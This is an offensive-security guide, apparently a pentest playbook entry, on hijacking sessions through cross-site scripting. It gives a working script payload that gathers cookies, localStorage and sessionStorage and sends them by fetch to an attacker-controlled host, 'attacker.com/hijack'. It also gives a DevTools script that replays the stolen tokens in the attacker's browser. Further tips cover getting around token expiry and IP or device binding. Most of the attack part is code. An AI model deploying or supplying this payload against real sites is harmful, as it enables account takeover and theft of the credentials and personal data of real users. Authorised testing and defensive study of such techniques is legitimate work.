# XSS — Session Hijacking

## When this applies

The application stores authentication state in `localStorage`, `sessionStorage`, or non-`HttpOnly` cookies. XSS lets you scrape all of it in one shot — cookies, JWT tokens in storage, user identifiers, OAuth tokens, refresh tokens — and reproduce the victim's session in your own browser.

## Technique

Iterate over `localStorage`, `sessionStorage`, `document.cookie` plus environmental signals (`location`, `referrer`, `userAgent`) and exfiltrate as a single JSON blob. Replay by injecting the captured values into your own browser via DevTools or a session-restoration script.

## Steps

### Complete Session Takeover

```javascript
<script>
// Gather all session data
var sessionData = {
    cookies: document.cookie,
    localStorage: {},
    sessionStorage: {},
    location: location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
};

// Extract all storage
for(var key in localStorage) {
    if(localStorage.hasOwnProperty(key)) {
        sessionData.localStorage[key] = localStorage[key];
    }
}

for(var key in sessionStorage) {
    if(sessionStorage.hasOwnProperty(key)) {
        sessionData.sessionStorage[key] = sessionStorage[key];
    }
}

// Exfiltrate everything
fetch('https://attacker.com/hijack', {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify(sessionData)
});
</script>
```

### Replaying the Session

After exfiltration, in attacker's browser DevTools console on the same origin:
```javascript
// Restore cookies (each cookie individually)
document.cookie = "session=VICTIM_SESSION; path=/";

// Restore localStorage
Object.entries({...victimLocalStorage}).forEach(([k, v]) => localStorage.setItem(k, v));

// Restore sessionStorage
Object.entries({...victimSessionStorage}).forEach(([k, v]) => sessionStorage.setItem(k, v));

// Reload to apply
location.reload();
```

## Verifying success

- Attacker endpoint receives a JSON object containing `cookies`, `localStorage` (with auth tokens / JWTs), and `sessionStorage` keys.
- Replaying captured values in attacker's browser opens the victim's account without re-auth.
- Authenticated API calls (`/me`, `/profile`, `/account`) using the captured token return the victim's data.

## Common pitfalls

1. **`HttpOnly` cookies are invisible** — the cookie scrape returns empty for those. Combine with token-bearer storage scrapes (`localStorage` JWTs) which usually aren't `HttpOnly`-protected.
2. **`for...in` on Storage iterates only enumerable properties** — modern browsers expose `Storage.prototype.length` and indexed access; use `Object.keys(localStorage)` or iterate with `localStorage.key(i)` for full reliability.
3. **Cookies bound to specific path/domain** — restoring at `/` may not work if cookie was set at `/app`; capture and replay the `Path` attribute too (requires sniffing `Set-Cookie` headers, not `document.cookie`).
4. **Short-lived tokens** — refresh tokens or sliding-expiry sessions can invalidate quickly; replay immediately.
5. **IP / device fingerprint binding** — some apps bind sessions to user agent or IP; replicate `navigator.userAgent` from capture and (if needed) proxy through victim's network.

## Tools

- **DevTools → Application → Storage** — visually verify and edit captured cookies / localStorage / sessionStorage in attacker browser
- **EditThisCookie / Cookie-Editor extension** — bulk import captured cookies
- **Burp Collaborator** — receive the JSON blob exfiltration
- **Burp Replicator / Repeater** — replay authenticated API calls with captured Bearer tokens
